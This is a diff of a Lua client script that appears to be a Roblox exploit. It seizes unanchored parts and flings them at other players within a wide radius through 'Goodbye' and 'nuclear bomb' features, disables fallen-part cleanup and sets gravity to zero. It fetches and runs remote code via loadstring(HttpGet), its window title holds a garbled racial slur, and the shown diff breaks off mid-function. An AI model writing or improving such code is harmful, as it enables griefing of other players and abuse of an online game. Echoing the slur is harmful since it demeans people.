@@ -1,12 +1,12 @@
--- Full updated script (client) - Improved Goodbye & Nuclear Bomb
--- Changes vs prior:
---  1) Nuke restores Workspace.Gravity back to original value after 3s (guaranteed).
---  2) When detonating (nuke) or when Goodbye BHs "collide", BH parts are destroyed first and
---     part velocities are applied only after a 0.1s delay.
---  3) Pressing "nuclear bomb." now starts gathering IMMEDIATELY. The red "kim ung yong" button triggers explosion.
---  4) Mass-lag protections (caps & batching) added for both flows to avoid crashing the game.
---  5) Re-added skidding for target all/selected (kept original skid logic).
---  6) Kept all original toggles & behavior; added minimal UI and safe guards.
+-- Full updated script (client) - Updated per user requests
+-- Highlights:
+--  * Auto set Workspace.FallenPartsDestroyHeight = NaN
+--  * Telekinesis fix + playerlist loadstrings auto-fired at GUI launch
+--  * "Goodbye." button: spawns BH clusters, attaches parts (capped) to BHs, BHs destroyed then 0.4s later parts are velocity-applied (1500) and collisions disabled
+--  * "nuclear bomb." button: pressing it starts gathering immediately; the red round "kim ung yong" button on the overlay triggers the explosion; overlay is destroyed instantly upon detonation
+--  * Nuke: gather attached parts to central BH, set Workspace.Gravity = 0 while gathered, on detonation destroy BH, wait 0.4s, then apply perfectly distributed sphere velocities (1500) and disable collisions. Gravity restored to original Workspace.Gravity 3s after detonation has fired
+--  * Caps added to avoid mass-lag crashes during Goodbye (configurable)
+--  * Skidding for target all & selected preserved
 
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
@@ -18,17 +18,14 @@ local localPlayer = Players.LocalPlayer
 -- Prevent automatic removal of fallen parts
 pcall(function() Workspace.FallenPartsDestroyHeight = 0/0 end) -- NaN
 
--- ---------- UTILITY & CONFIG ----------
+-- Save the original gravity value for reliable restore
+local ORIGINAL_GRAVITY = Workspace.Gravity
+
 local function clamp(val, a, b)
     if val < a then return a end
     if val > b then return b end
     return val
 end
-
--- Performance / safety caps (tweakable)
-local MAX_GATHER_PARTS = 200       -- maximum number of parts to gather for nuke/goodbye to avoid mass lag
-local BATCH_SIZE = 25              -- process parts in batches of this size, then yield
-local SPLIT_IF_FEWER_THAN = 80     -- split each part into pieces only if total parts gathered less than this
 
 -- ====== CONFIG / STATE ======
 local targetAllActive = false
@@ -115,6 +112,18 @@ local playerLastVelTime = {}
 -- New toggles' state
 local InstaVoid = false
 local NegativeFling = false
+
+-- Nuke state
+local nukeGathering = false
+local nukeHeldParts = {}        -- list of parts currently held for nuke
+local nukeCenterFolder = nil
+local nukeCenterPart = nil
+local nukeCenterAttachment = nil
+local nukeOverlayGui = nil
+local nukeMaxParts = 400        -- cap to avoid lag; adjust downward if you still have crashes
+
+-- Goodbye caps to prevent mass-lag
+local goodbyeMaxParts = 200     -- total pieces / clones attached across BHs; adjust as needed
 
 -- Setup folder & primary attachment
 local function setupPlayer()
@@ -696,8 +705,8 @@ local function createExtraBlackHole(initialTarget, source)
                         -- Very aggressive lerp toward targetCF (straight line skid)
                         bh.smoothedCF = curCF:Lerp(targetCF, skidAlpha)
 
-                        if bh.Attachment then
-                            pcall(function() bh.Attachment.WorldCFrame = bh.smoothedCF end)
+                        if att then
+                            att.WorldCFrame = bh.smoothedCF
                         end
                     end
                 end
@@ -713,7 +722,7 @@ local function createExtraBlackHole(initialTarget, source)
 
                 if not hasValidTargets then
                     setBlackHoleActiveState(bh, false)
-                    if Attachment1 and Attachment1.Parent and bh.Attachment then
+                    if Attachment1 and Attachment1.Parent and att then
                         local success, cur = pcall(function() return bh.Attachment.WorldCFrame end)
                         local curCF = success and cur or bh.smoothedCF or bh.Part.CFrame
                         local centerCF
@@ -724,19 +733,19 @@ local function createExtraBlackHole(initialTarget, source)
                             if idleAlpha < 0.01 then idleAlpha = 0.01 end
                             if idleAlpha > 0.99 then idleAlpha = 0.99 end
                             bh.smoothedCF = curCF:Lerp(targetCF, idleAlpha)
-                            pcall(function() bh.Attachment.WorldCFrame = bh.smoothedCF end)
+                            att.WorldCFrame = bh.smoothedCF
                         end
                     end
                     wait(0.06)
                 else
-                    if bh.Attachment then
+                    if att then
                         local success, cur = pcall(function() return bh.Attachment.WorldCFrame end)
                         local curCF = success and cur or bh.smoothedCF or bh.Part.CFrame
                         local idleAlpha = 1 - math.exp(- (SKID_SMOOTHNESS * 0.6) * dt)
                         if idleAlpha < 0.01 then idleAlpha = 0.01 end
                         if idleAlpha > 0.85 then idleAlpha = 0.85 end
                         bh.smoothedCF = curCF:Lerp(curCF, idleAlpha)
-                        pcall(function() bh.Attachment.WorldCFrame = bh.smoothedCF end)
+                        att.WorldCFrame = bh.smoothedCF
                     end
                 end
             end
@@ -1404,102 +1413,88 @@ end
 
 Players.LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
 
--- ---------- NEW FEATURES: Goodbye & Nuclear bomb (improved) ----------
+-- GUI (TurtleLib)
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
+local window = library:Window("Fix it you panis negor🗣🔥")
 
--- Helper: splitPartIntoPieces (limited & safe)
-local function splitPartIntoPieces(part, pieces)
-    pieces = pieces or 3
-    local clones = {}
-    if not part or not part.Parent then return clones end
-    pcall(function()
-        -- compute smaller size but ensure minimum extents
-        local baseSize = part.Size / math.max(1, pieces^(1/3))
-        for i = 1, pieces do
-            local c = part:Clone()
-            c.Name = part.Name .. "_split_" .. tostring(i)
-            c.Size = Vector3.new(math.max(0.2, baseSize.X), math.max(0.2, baseSize.Y), math.max(0.2, baseSize.Z))
-            c.CFrame = part.CFrame * CFrame.new((i - 2) * 0.5, math.random(-1,1)*0.3, math.random(-1,1)*0.3)
-            c.Parent = part.Parent
-            c.Anchored = false
-            stripBodyForces(c)
-            table.insert(clones, c)
-        end
-        -- destroy original to simulate splitting
-        pcall(function() part:Destroy() end)
-    end)
-    return clones
-end
+window:Toggle("Unanchored Target All", false, function(Value) setTargetAll(Value) end)
+window:Toggle("Target Selected Players", false, function(Value) setTargetSelected(Value) end)
 
--- Golden spiral / uniform sphere directions for perfect sphere distribution
+window:Toggle("Life Cycle Mode", false, function(Value)
+    LifeCycleMode = Value
+    if LifeCycleMode then
+        tryStartCycleIfNeeded()
+    else
+        endCycleMode()
+    end
+end)
+
+window:Button("Reset Cycle", function()
+    resetCycleNow()
+end)
+
+-- GOODBYE: helper functions
+-- uniform sphere distribution: golden spiral
 local function goldenSphereDirections(n)
     local out = {}
     if n <= 0 then return out end
-    if n == 1 then return { Vector3.new(0,1,0) } end
-    local phi = math.pi * (3 - math.sqrt(5))
+    if n == 1 then return {Vector3.new(0,1,0)} end
+    local phi = math.pi * (3 - math.sqrt(5)) -- golden angle
     for i = 0, n-1 do
-        local y = 1 - (i / (n - 1)) * 2
+        local y = 1 - (i / (n - 1)) * 2 -- y goes from 1 to -1
         local radius = math.sqrt(math.max(0, 1 - y*y))
         local theta = phi * i
         local x = math.cos(theta) * radius
         local z = math.sin(theta) * radius
         local v = Vector3.new(x, y, z)
-        if v.Magnitude > 0 then v = v.Unit end
-        table.insert(out, v)
+        if v.Magnitude == 0 then v = Vector3.new(0,1,0) end
+        table.insert(out, v.Unit)
     end
     return out
 end
 
--- Collect unanchored non-character parts (with cap and optional distance filter)
-local function collectUnanchoredParts(filterFn)
+-- collect all unanchored non-character parts (optionally limited)
+local function collectUnanchoredParts(limit)
+    limit = limit or math.huge
     local res = {}
     for _, v in ipairs(Workspace:GetDescendants()) do
+        if #res >= limit then break end
         if v:IsA("BasePart")
             and not v.Anchored
             and v.Name ~= "Handle"
             and not isPartPlayerCharacter(v)
             and not (localPlayer.Character and v:IsDescendantOf(localPlayer.Character)) then
-            if not filterFn or filterFn(v) then
-                table.insert(res, v)
-                if #res >= MAX_GATHER_PARTS then break end
-            end
+            table.insert(res, v)
         end
     end
     return res
 end
 
--- Safe function to detach parts and apply velocity after BH destroyed
-local function detachAndVelocityAfterDelay(partsList, velocityFn, delay)
-    delay = delay or 0.1
-    -- destroy the BH that was holding them (caller should destroy BH prior to calling this)
-    spawn(function()
-        wait(delay)
-        for _, p in ipairs(partsList) do
-            if p and p.Parent then
-                pcall(function()
-                    -- remove aligners & torque
-                    local ap = p:FindFirstChildOfClass("AlignPosition")
-                    if ap then ap:Destroy() end
-                    local torque = p:FindFirstChildOfClass("Torque")
-                    if torque then torque:Destroy() end
-                    p.CanCollide = true
-                    -- set massless back off if we had a stored original
-                    if initiallyMasslessParts[p] ~= nil then
-                        p.Massless = initiallyMasslessParts[p]
-                    else
-                        p.Massless = false
-                    end
-                    -- determine velocity
-                    local vel = Vector3.new(0,0,0)
-                    local ok, v = pcall(function() return velocityFn(p) end)
-                    if ok and v then vel = v end
-                    p.Velocity = vel
-                end)
-            end
+-- SAFE split (lightweight): clones are same size but we cap clones to avoid explosion
+local function splitPartIntoPiecesSafe(part, pieces)
+    pieces = pieces or 1
+    local out = {}
+    if not part or not part.Parent then return out end
+    pcall(function()
+        local parent = part.Parent
+        local size = part.Size
+        for i = 1, pieces do
+            if #out + 1 > 3 then break end -- don't create too many clones per single part
+            local c = part:Clone()
+            c.Name = part.Name .. "_split_" .. tostring(i)
+            c.Size = size -- keep same size to avoid many tiny pieces
+            c.CFrame = part.CFrame * CFrame.new(math.random(-2,2), math.random(-2,2), math.random(-2,2))
+            c.Anchored = false
+            c.Parent = parent
+            stripBodyForces(c)
+            table.insert(out, c)
         end
+        pcall(function() part:Destroy() end)
     end)
+    return out
 end
 
--- GOODBYE implementation (improved & batch-processed)
+-- GOODBYE per-player spawner
 local function spawnGoodbyeForPlayer(targetPlayer)
     if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
     local hrp = targetPlayer.Character.HumanoidRootPart
@@ -1509,10 +1504,10 @@ local function spawnGoodbyeForPlayer(targetPlayer)
     folder.Name = "ÆS_Goodbye_Folder"
 
     local BHs = {}
-
-    -- create 5 pentagon orbiters + up + down
     local pentagonRadius = 30
     local pentagonCount = 5
+
+    -- Create pentagon BHs (orbiters)
     for i = 1, pentagonCount do
         local angle = (2 * math.pi * (i-1)) / pentagonCount
         local x = math.cos(angle) * pentagonRadius
@@ -1531,38 +1526,88 @@ local function spawnGoodbyeForPlayer(targetPlayer)
             TargetPlayer = targetPlayer,
             _running = true,
             _active = true,
-            spinSpeed = 2,
+            spinSpeed = 2, -- radians/sec, accelerates
             source = "GOODBYE"
         }
         table.insert(BHs, bh)
     end
 
-    -- above
+    -- above and below
     local pUp = Instance.new("Part", folder)
-    pUp.Anchored = true
-    pUp.CanCollide = false
-    pUp.Size = Vector3.new(1,1,1)
-    pUp.Transparency = 1
+    pUp.Anchored = true; pUp.CanCollide = false; pUp.Size = Vector3.new(1,1,1); pUp.Transparency = 1
     pUp.Position = centerPos + Vector3.new(0, 40, 0)
     local attUp = Instance.new("Attachment", pUp)
     local bhUp = { Part = pUp, Attachment = attUp, AssignedParts = {}, TargetPlayer = targetPlayer, _running = true, _active = true, source = "GOODBYE" }
     table.insert(BHs, bhUp)
 
-    -- below
     local pDown = Instance.new("Part", folder)
-    pDown.Anchored = true
-    pDown.CanCollide = false
-    pDown.Size = Vector3.new(1,1,1)
-    pDown.Transparency = 1
+    pDown.Anchored = true; pDown.CanCollide = false; pDown.Size = Vector3.new(1,1,1); pDown.Transparency = 1
     pDown.Position = centerPos + Vector3.new(0, -40, 0)
     local attDown = Instance.new("Attachment", pDown)
     local bhDown = { Part = pDown, Attachment = attDown, AssignedParts = {}, TargetPlayer = targetPlayer, _running = true, _active = true, source = "GOODBYE" }
     table.insert(BHs, bhDown)
 
-    -- add to global list
-    for _, bh in ipairs(BHs) do table.insert(extraBlackHoles, bh) end
+    -- register BHs in master list (so rebalancer can see them if needed)
+    for _, bh in ipairs(BHs) do
+        table.insert(extraBlackHoles, bh)
+    end
 
-    -- spawn coroutines for BH motion & collision triggers
+    -- attach _some_ unanchored parts to these BHs (capped)
+    spawn(function()
+        if goodbyeMaxParts <= 0 then return end
+        local available = collectUnanchoredParts(goodbyeMaxParts)
+        -- choose the parts nearest to targetPlayer HRP (to be deterministic and limited)
+        table.sort(available, function(a,b)
+            local da = (a.Position - centerPos).Magnitude
+            local db = (b.Position - centerPos).Magnitude
+            return da < db
+        end)
+        local assignedCount = 0
+        for _, part in ipairs(available) do
+            if assignedCount >= goodbyeMaxParts then break end
+            if not part or not part.Parent then continue end
+            pcall(function()
+                -- split into up to 1-2 pieces (safe), avoid massive cloning
+                local pieces = splitPartIntoPiecesSafe(part, 1)
+                for _, pclone in ipairs(pieces) do
+                    if pclone and pclone.Parent then
+                        -- choose nearest BH in BHs list
+                        local nearestBH = nil
+                        local nd = math.huge
+                        for _, bh in ipairs(BHs) do
+                            if bh and bh.Part then
+                                local d = (pclone.Position - bh.Part.Position).Magnitude
+                                if d < nd then nd = d; nearestBH = bh end
+                            end
+                        end
+                        if nearestBH then
+                            pclone.CFrame = nearestBH.Part.CFrame * CFrame.new(0, 0.5 + math.random()*2, 0)
+                            pclone.Anchored = false
+                            stripBodyForces(pclone)
+                            pcall(function() pclone.Massless = true end)
+                            local Torque = Instance.new("Torque", pclone)
+                            Torque.Torque = FLING_TORQUE
+                            local AlignPosition = Instance.new("AlignPosition", pclone)
+                            local Attachment2 = Instance.new("Attachment", pclone)
+                            pcall(function() Attachment2.WorldCFrame = pclone.CFrame end)
+                            Torque.Attachment0 = Attachment2
+                            AlignPosition.MaxForce = PULL_MAX_FORCE
+                            AlignPosition.MaxVelocity = math.huge
+                            AlignPosition.Responsiveness = PULL_RESPONSIVENESS
+                            AlignPosition.Attachment0 = Attachment2
+                            AlignPosition.Attachment1 = nearestBH.Attachment
+                            pclone.CanCollide = false
+                            table.insert(nearestBH.AssignedParts, pclone)
+                            assignedCount = assignedCount + 1
+                            if assignedCount >= goodbyeMaxParts then break end
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+
+    -- BH motion threads: orbit + approach logic; on 'collision' destroy BH, then after 0.4s apply velocities to assigned parts
     for idx, bh in ipairs(BHs) do
         spawn(function()
             local t = 0
@@ -1570,6 +1615,7 @@ local function spawnGoodbyeForPlayer(targetPlayer)
             while bh._running do
                 local dt = RunService.Heartbeat:Wait()
                 t = t + dt
+
                 if not (bh.TargetPlayer and bh.TargetPlayer.Character and bh.TargetPlayer.Character:FindFirstChild("HumanoidRootPart")) then
                     bh._running = false
                     break
@@ -1578,48 +1624,55 @@ local function spawnGoodbyeForPlayer(targetPlayer)
                 local targetPos = targetHRP.Position
 
                 if isPentagon then
-                    bh.spinSpeed = bh.spinSpeed + (dt * 0.8) -- accelerate
+                    bh.spinSpeed = bh.spinSpeed + (dt * 0.8)
                     local curPos = bh.Part.Position
                     local distToHRP = (curPos - targetPos).Magnitude
-                    -- if close enough, trigger collision routine:
                     if distToHRP <= 1.6 then
+                        -- DESTROY BH immediately
                         bh._running = false
-                        -- remove bh object from global list and destroy BH part first
-                        local assigned = {}
-
-                        -- copy assigned parts then clear BH.assign to avoid double processing
-                        for i = 1, #bh.AssignedParts do table.insert(assigned, bh.AssignedParts[i]) end
-                        bh.AssignedParts = {}
-
-                        -- destroy BH now
+                        -- remove BH visuals/part
                         pcall(function()
                             for i = #extraBlackHoles, 1, -1 do
                                 if extraBlackHoles[i] == bh then table.remove(extraBlackHoles, i); break end
                             end
                         end)
-                        if bh.Part and bh.Part.Parent then bh.Part:Destroy() end
-
-                        -- after 0.1s apply velocities (random-ish outward 300)
-                        detachAndVelocityAfterDelay(assigned, function(part)
-                            -- random-ish outward direction away from player HRP center
-                            local dir = (part.Position - targetPos).Unit
-                            if dir.Magnitude == 0 then dir = Vector3.new(1,0,0) end
-                            return dir * 300
-                        end, 0.1)
+                        local assignedParts = {}
+                        for _, ppart in ipairs(bh.AssignedParts) do table.insert(assignedParts, ppart) end
+                        -- destroy BH part
+                        pcall(function() if bh.Part and bh.Part.Parent then bh.Part:Destroy() end end)
+                        -- 0.4s after BH destruction: disable collisions and fling parts with velocity=1500
+                        spawn(function()
+                            wait(0.4)
+                            local dirs = goldenSphereDirections(#assignedParts)
+                            for i, ppart in ipairs(assignedParts) do
+                                if ppart and ppart.Parent then
+                                    pcall(function()
+                                        local ap = ppart:FindFirstChildOfClass("AlignPosition")
+                                        if ap then ap:Destroy() end
+                                        local torque = ppart:FindFirstChildOfClass("Torque")
+                                        if torque then torque:Destroy() end
+                                        ppart.CanCollide = false
+                                        pcall(function() ppart.Massless = false end)
+                                        local dir = dirs[((i-1) % #dirs) + 1] or Vector3.new(0,1,0)
+                                        ppart.Velocity = dir * 1500
+                                    end)
+                                end
+                            end
+                        end)
                         break
                     else
-                        -- orbit
+                        -- normal orbit movement
                         local angleOff = (2 * math.pi * (idx-1) / pentagonCount) + (t * bh.spinSpeed)
                         local x = math.cos(angleOff) * pentagonRadius
                         local z = math.sin(angleOff) * pentagonRadius
                         local desiredPos = targetPos + Vector3.new(x, 0, z)
                         pcall(function()
                             bh.Part.CFrame = CFrame.new(desiredPos)
-                            if bh.Attachment then bh.Attachment.WorldCFrame = bh.Part.CFrame end
+                            bh.Attachment.WorldCFrame = bh.Part.CFrame
                         end)
                     end
                 else
-                    -- above / below closing slowly
+                    -- above/below close-in then act same (destroy BH then 0.4s later fling)
                     local curPos = bh.Part.Position
                     local dir = (targetPos - curPos)
                     local dist = dir.Magnitude
@@ -1628,239 +1681,76 @@ local function spawnGoodbyeForPlayer(targetPlayer)
                         local newPos = curPos + dir.Unit * math.min(step, dist)
                         pcall(function()
                             bh.Part.CFrame = CFrame.new(newPos)
-                            if bh.Attachment then bh.Attachment.WorldCFrame = bh.Part.CFrame end
+                            bh.Attachment.WorldCFrame = bh.Part.CFrame
                         end)
                     else
                         bh._running = false
-                        local assigned = {}
-                        for i = 1, #bh.AssignedParts do table.insert(assigned, bh.AssignedParts[i]) end
-                        bh.AssignedParts = {}
-
-                        -- destroy BH and then apply velocities after 0.1s
                         pcall(function()
                             for i = #extraBlackHoles, 1, -1 do
                                 if extraBlackHoles[i] == bh then table.remove(extraBlackHoles, i); break end
                             end
                         end)
-                        if bh.Part and bh.Part.Parent then bh.Part:Destroy() end
-
-                        detachAndVelocityAfterDelay(assigned, function(part)
-                            local dir = (part.Position - targetPos).Unit
-                            if dir.Magnitude == 0 then dir = Vector3.new(1,0,0) end
-                            return dir * 300
-                        end, 0.1)
+                        local assignedParts = {}
+                        for _, ppart in ipairs(bh.AssignedParts) do table.insert(assignedParts, ppart) end
+                        pcall(function() if bh.Part and bh.Part.Parent then bh.Part:Destroy() end end)
+                        spawn(function()
+                            wait(0.4)
+                            local dirs = goldenSphereDirections(#assignedParts)
+                            for i, ppart in ipairs(assignedParts) do
+                                if ppart and ppart.Parent then
+                                    pcall(function()
+                                        local ap = ppart:FindFirstChildOfClass("AlignPosition")
+                                        if ap then ap:Destroy() end
+                                        local torque = ppart:FindFirstChildOfClass("Torque")
+                                        if torque then torque:Destroy() end
+                                        ppart.CanCollide = false
+                                        pcall(function() ppart.Massless = false end)
+                                        local dir = dirs[((i-1) % #dirs) + 1] or Vector3.new(0,1,0)
+                                        ppart.Velocity = dir * 1500
+                                    end)
+                                end
+                            end
+                        end)
                         break
                     end
                 end
             end
-            -- cleanup BH part if still exists
+
+            -- cleanup
             pcall(function()
                 if bh.Part and bh.Part.Parent then bh.Part:Destroy() end
+                for i = #extraBlackHoles, 1, -1 do
+                    if extraBlackHoles[i] == bh then table.remove(extraBlackHoles, i); break end
+                end
             end)
         end)
     end
-
-    -- Attach nearby unanchored parts to these BHs, but LIMIT total processed and batch to avoid mass lag
-    spawn(function()
-        local parts = collectUnanchoredParts()
-        -- If too many parts, reduce by sampling nearest (to player)
-        if #parts > MAX_GATHER_PARTS then
-            table.sort(parts, function(a,b)
-                local da = (a.Position - centerPos).Magnitude
-                local db = (b.Position - centerPos).Magnitude
-                return da < db
-            end)
-            while #parts > MAX_GATHER_PARTS do table.remove(parts) end
-        end
-
-        -- decide splitting policy
-        local doSplit = (#parts <= SPLIT_IF_FEWER_THAN)
-
-        local batch = {}
-        local count = 0
-        for _, part in ipairs(parts) do
-            if not part or not part.Parent then continue end
-            table.insert(batch, part)
-            count = count + 1
-            if #batch >= BATCH_SIZE then
-                -- process batch
-                for _, p in ipairs(batch) do
-                    if p and p.Parent then
-                        pcall(function()
-                            if doSplit then
-                                local clones = splitPartIntoPieces(p, 3)
-                                -- attach each clone to nearest BH
-                                for _, c in ipairs(clones) do
-                                    if c and c.Parent then
-                                        -- find nearest BH
-                                        local nearestBH, nd = nil, math.huge
-                                        for _, bh in ipairs(BHs) do
-                                            if bh and bh.Part then
-                                                local d = (c.Position - bh.Part.Position).Magnitude
-                                                if d < nd then nd = d; nearestBH = bh end
-                                            end
-                                        end
-                                        if nearestBH then
-                                            pcall(function()
-                                                c.Anchored = false
-                                                stripBodyForces(c)
-                                                pcall(function() c.Massless = true end)
-                                                local Torque = Instance.new("Torque", c)
-                                                Torque.Torque = FLING_TORQUE
-                                                local AlignPosition = Instance.new("AlignPosition", c)
-                                                local Attachment2 = Instance.new("Attachment", c)
-                                                Attachment2.WorldCFrame = c.CFrame
-                                                Torque.Attachment0 = Attachment2
-                                                AlignPosition.MaxForce = PULL_MAX_FORCE
-                                                AlignPosition.MaxVelocity = math.huge
-                                                AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                                                AlignPosition.Attachment0 = Attachment2
-                                                AlignPosition.Attachment1 = nearestBH.Attachment
-                                                c.CanCollide = false
-                                                table.insert(nearestBH.AssignedParts, c)
-                                            end)
-                                        end
-                                    end
-                                end
-                            else
-                                -- attach original part to nearest BH without splitting
-                                local nearestBH, nd = nil, math.huge
-                                for _, bh in ipairs(BHs) do
-                                    if bh and bh.Part then
-                                        local d = (p.Position - bh.Part.Position).Magnitude
-                                        if d < nd then nd = d; nearestBH = bh end
-                                    end
-                                end
-                                if nearestBH then
-                                    p.Anchored = false
-                                    stripBodyForces(p)
-                                    pcall(function() p.Massless = true end)
-                                    local Torque = Instance.new("Torque", p)
-                                    Torque.Torque = FLING_TORQUE
-                                    local AlignPosition = Instance.new("AlignPosition", p)
-                                    local Attachment2 = Instance.new("Attachment", p)
-                                    Attachment2.WorldCFrame = p.CFrame
-                                    Torque.Attachment0 = Attachment2
-                                    AlignPosition.MaxForce = PULL_MAX_FORCE
-                                    AlignPosition.MaxVelocity = math.huge
-                                    AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                                    AlignPosition.Attachment0 = Attachment2
-                                    AlignPosition.Attachment1 = nearestBH.Attachment
-                                    p.CanCollide = false
-                                    table.insert(nearestBH.AssignedParts, p)
-                                end
-                            end
-                        end)
-                    end
-                end
-                batch = {}
-                wait(0.08) -- yield to avoid frame spike
-            end
-        end
-
-        -- final leftover batch
-        for _, p in ipairs(batch) do
-            if p and p.Parent then
-                pcall(function()
-                    if doSplit then
-                        local clones = splitPartIntoPieces(p, 3)
-                        for _, c in ipairs(clones) do
-                            if c and c.Parent then
-                                local nearestBH, nd = nil, math.huge
-                                for _, bh in ipairs(BHs) do
-                                    if bh and bh.Part then
-                                        local d = (c.Position - bh.Part.Position).Magnitude
-                                        if d < nd then nd = d; nearestBH = bh end
-                                    end
-                                end
-                                if nearestBH then
-                                    pcall(function()
-                                        c.Anchored = false
-                                        stripBodyForces(c)
-                                        pcall(function() c.Massless = true end)
-                                        local Torque = Instance.new("Torque", c)
-                                        Torque.Torque = FLING_TORQUE
-                                        local AlignPosition = Instance.new("AlignPosition", c)
-                                        local Attachment2 = Instance.new("Attachment", c)
-                                        Attachment2.WorldCFrame = c.CFrame
-                                        Torque.Attachment0 = Attachment2
-                                        AlignPosition.MaxForce = PULL_MAX_FORCE
-                                        AlignPosition.MaxVelocity = math.huge
-                                        AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                                        AlignPosition.Attachment0 = Attachment2
-                                        AlignPosition.Attachment1 = nearestBH.Attachment
-                                        c.CanCollide = false
-                                        table.insert(nearestBH.AssignedParts, c)
-                                    end)
-                                end
-                            end
-                        end
-                    else
-                        local nearestBH, nd = nil, math.huge
-                        for _, bh in ipairs(BHs) do
-                            if bh and bh.Part then
-                                local d = (p.Position - bh.Part.Position).Magnitude
-                                if d < nd then nd = d; nearestBH = bh end
-                            end
-                        end
-                        if nearestBH then
-                            p.Anchored = false
-                            stripBodyForces(p)
-                            pcall(function() p.Massless = true end)
-                            local Torque = Instance.new("Torque", p)
-                            Torque.Torque = FLING_TORQUE
-                            local AlignPosition = Instance.new("AlignPosition", p)
-                            local Attachment2 = Instance.new("Attachment", p)
-                            Attachment2.WorldCFrame = p.CFrame
-                            Torque.Attachment0 = Attachment2
-                            AlignPosition.MaxForce = PULL_MAX_FORCE
-                            AlignPosition.MaxVelocity = math.huge
-                            AlignPosition.Responsiveness = PULL_RESPONSIVENESS
-                            AlignPosition.Attachment0 = Attachment2
-                            AlignPosition.Attachment1 = nearestBH.Attachment
-                            p.CanCollide = false
-                            table.insert(nearestBH.AssignedParts, p)
-                        end
-                    end
-                end)
-            end
-        end
-    end)
 end
 
--- Top-level Goodbye trigger: spawn clusters for players in radius (and local player)
 local function triggerGoodbye()
     local blastRadius = 3500
     local playersToTarget = {}
+    -- target non-local players inside radius
     for _, pl in ipairs(Players:GetPlayers()) do
         if pl and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
-            local basePos = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and localPlayer.Character.HumanoidRootPart.Position) or Vector3.new(0,0,0)
+            local lpHRP = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")) and localPlayer.Character.HumanoidRootPart
+            local basePos = lpHRP and lpHRP.Position or (localPlayer.Character and localPlayer.Character:GetModelCFrame().p or Vector3.new(0,0,0))
             local d = (pl.Character.HumanoidRootPart.Position - basePos).Magnitude
-            if d <= blastRadius then
-                table.insert(playersToTarget, pl)
-            end
+            if d <= blastRadius then table.insert(playersToTarget, pl) end
         end
     end
-    -- Always include local player
+    -- always include localplayer cluster (user wanted BHs for every player)
     if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
         table.insert(playersToTarget, localPlayer)
     end
 
+    -- spawn clusters (capped by goodbyeMaxParts via attachment logic)
     for _, pl in ipairs(playersToTarget) do
         spawnGoodbyeForPlayer(pl)
     end
 end
 
--- NUCLEAR BOMB implementation (gather on button press; explosion on red button)
-local nukeState = {
-    collecting = false,
-    collectedParts = {},
-    folder = nil,
-    centerPart = nil,
-    centerAttachment = nil,
-    ownerPos = nil
-}
-
+-- NUCLEAR BOMB: Gathering + Detonate split
 local function createCentralNukeHolder()
     local folder = Workspace:FindFirstChild("ÆS_Nuke_Folder") or Instance.new("Folder", Workspace)
     folder.Name = "ÆS_Nuke_Folder"
@@ -1873,221 +1763,129 @@ local function createCentralNukeHolder()
     return folder, center
 end
 
--- Start gathering immediately when the "nuclear bomb." button is pressed
+-- Start gathering right away (called when Turtle "nuclear bomb." button pressed)
 local function startNukeGather()
-    if nukeState.collecting then return end
-    nukeState.collecting = true
-    nukeState.collectedParts = {}
-    nukeState.folder, nukeState.centerPart = createCentralNukeHolder()
-    nukeState.centerPart.CFrame = (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and localPlayer.Character.HumanoidRootPart.CFrame) or CFrame.new(0,0,0)
-    nukeState.centerAttachment = Instance.new("Attachment", nukeState.centerPart)
-    nukeState.ownerPos = nukeState.centerPart.Position
+    if nukeGathering then return end
+    if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+    nukeGathering = true
+    nukeHeldParts = {}
 
-    spawn(function()
-        local parts = collectUnanchoredParts()
-        -- If too many parts, pick the nearest MAX_GATHER_PARTS to the center
-        if #parts > MAX_GATHER_PARTS then
-            table.sort(parts, function(a,b)
-                local da = (a.Position - nukeState.ownerPos).Magnitude
-                local db = (b.Position - nukeState.ownerPos).Magnitude
-                return da < db
+    local centerPos = localPlayer.Character.HumanoidRootPart.Position
+    nukeCenterFolder, nukeCenterPart = createCentralNukeHolder()
+    nukeCenterPart.CFrame = CFrame.new(centerPos)
+    nukeCenterAttachment = Instance.new("Attachment", nukeCenterPart)
+
+    -- collect up to nukeMaxParts parts (capped to avoid massive lag)
+    local parts = collectUnanchoredParts(nukeMaxParts)
+    for _, p in ipairs(parts) do
+        if p and p.Parent then
+            pcall(function()
+                if isPartPlayerCharacter(p) then return end
+                if initiallyMasslessParts[p] == nil then pcall(function() initiallyMasslessParts[p] = p.Massless end) end
+                p.Massless = true
+                stripBodyForces(p)
+                p.CanCollide = false
+                -- Align to center attachment
+                local ap = Instance.new("AlignPosition", p)
+                local att = Instance.new("Attachment", p)
+                pcall(function() att.WorldCFrame = p.CFrame end)
+                ap.Attachment0 = att
+                ap.Attachment1 = nukeCenterAttachment
+                ap.MaxForce = PULL_MAX_FORCE
+                ap.MaxVelocity = math.huge
+                ap.Responsiveness = PULL_RESPONSIVENESS
+                p.Velocity = Vector3.new(0,0,0)
+                table.insert(nukeHeldParts, p)
             end)
-            while #parts > MAX_GATHER_PARTS do table.remove(parts) end
         end
+    end
 
-        local doSplit = (#parts <= SPLIT_IF_FEWER_THAN)
-        local batch = {}
-        for _, part in ipairs(parts) do
-            table.insert(batch, part)
-            if #batch >= BATCH_SIZE then
-                for _, p in ipairs(batch) do
-                    if p and p.Parent then
-                        pcall(function()
-                            if isPartPlayerCharacter(p) then return end
-                            -- attach or clone
-                            if doSplit then
-                                local clones = splitPartIntoPieces(p, 3)
-                                for _, c in ipairs(clones) do
-                                    if c and c.Parent then
-                                        stripBodyForces(c)
-                                        pcall(function() c.Massless = true end)
-                                        c.CanCollide = false
-                                        local Torque = Instance.new("Torque", c)
